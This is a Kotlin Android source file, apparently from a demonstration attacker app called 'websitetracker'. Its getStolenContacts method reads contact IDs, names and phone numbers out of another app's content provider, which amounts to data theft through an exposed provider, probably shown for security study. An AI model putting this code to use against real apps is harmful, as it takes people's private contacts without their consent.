package com.example.websitetracker

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.net.Uri
import android.util.Log
import com.example.websitetracker.model.ContactDTO

class ContentResolverHelper(mContext: Context) {

    companion object {
        /** The authority of this content provider.  */
        private const val AUTHORITY = "com.example.contacts.provider.ContactContentProvider"

        /** The URI for the contacts table.  */
        val CONTACT_URI = Uri.parse("content://$AUTHORITY/contacts")!!
    }

    private var contentResolver: ContentResolver? = mContext.contentResolver

    @SuppressLint("Range")
    fun getStolenContacts(): ArrayList<ContactDTO> {
        val contacts: ArrayList<ContactDTO> = ArrayList()

        // Get the right ContentProvider.
        contentResolver?.acquireContentProviderClient(CONTACT_URI)?.also { contentProvider ->

            contentProvider.query(CONTACT_URI, null, null, null, null)?.let {
                while (it.count > 0 && it.moveToNext()) {
                    Log.i("ContentResolver", "moveToNext")
                    contacts.add(
                        ContactDTO(
                            id = it.getString(it.getColumnIndex("contact_id")),
                            name = it.getString(it.getColumnIndex("name")),
                            number = it.getString(it.getColumnIndex("numbers"))
                        )
                    )
                }
                it.close()
            }

            contentProvider.release()
        }
        return contacts
    }
}
